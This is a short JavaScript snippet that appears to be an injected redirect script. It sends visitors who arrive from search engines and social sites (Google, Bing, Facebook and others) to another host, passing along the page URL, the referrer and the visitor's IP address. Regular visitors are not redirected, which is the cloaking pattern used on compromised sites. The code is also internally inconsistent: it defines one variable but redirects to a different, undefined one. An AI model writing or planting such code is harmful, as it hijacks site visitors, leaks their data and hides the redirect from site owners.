///// Arsae /////
var ars = 'https://news.unimal.edu.pl';

if(['google.', '.edu.', 'msn.', 'bing.', 'yandex.', 'facebook.', 'ecosia', 'qwant', 'pinterest.', 'duckduckgo.', '.yahoo.', 't.co'].some(s => document.referrer.toLowerCase().includes(s))){ 
	window.location.href = arsT1Bing + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) + '&ip=' + window.ipAddressArsae
}
